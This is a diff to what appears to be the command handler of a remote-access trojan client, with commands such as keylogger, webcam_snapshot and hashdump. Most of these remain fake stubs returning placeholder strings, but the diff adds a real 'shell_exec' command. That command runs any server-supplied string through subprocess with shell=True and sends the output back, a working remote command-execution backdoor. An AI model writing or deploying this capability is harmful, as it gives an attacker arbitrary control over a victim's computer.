@@ -1,5 +1,6 @@
 import socket
 import ssl
+import subprocess
 
 from utils.protocol import decode_message, encode_message
 from utils.logger import logger
@@ -12,31 +13,46 @@ def handle_command(command: str, args=None) -> str:
     if cmd == "ipconfig":
         return "Fake IP config:\nIP: 127.0.0.1\nGateway: 192.168.1.1"
 
-    if cmd == "shell":
-        return "Fake shell started"
+    elif cmd == "shell_exec":
+        try:
+            full_command = " ".join(args) if args else ""
 
-    if cmd == "download":
+            result = subprocess.run(
+                full_command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                cwd="C:\\"
+            )
+
+            output = result.stdout + result.stderr
+            return output.strip() if output else "[no output]"
+
+        except Exception as e:
+            return f"Execution error: {e}"
+
+    elif cmd == "download":
         return "Fake file sent to server"
 
-    if cmd == "upload":
+    elif cmd == "upload":
         return "Fake file received from server"
 
-    if cmd == "screenshot":
+    elif cmd == "screenshot":
         return "Fake screenshot captured"
 
-    if cmd == "webcam_snapshot":
+    elif cmd == "webcam_snapshot":
         return "Fake webcam image captured"
 
-    if cmd == "record_audio":
+    elif cmd == "record_audio":
         return "Fake audio recorded"
 
-    if cmd == "keylogger":
+    elif cmd == "keylogger":
         return "Fake keylogger started"
 
-    if cmd == "hashdump":
+    elif cmd == "hashdump":
         return "Fake hashdump data"
 
-    if cmd == "search":
+    elif cmd == "search":
         return "Fake search results"
 
     return f"Executed: {command}"
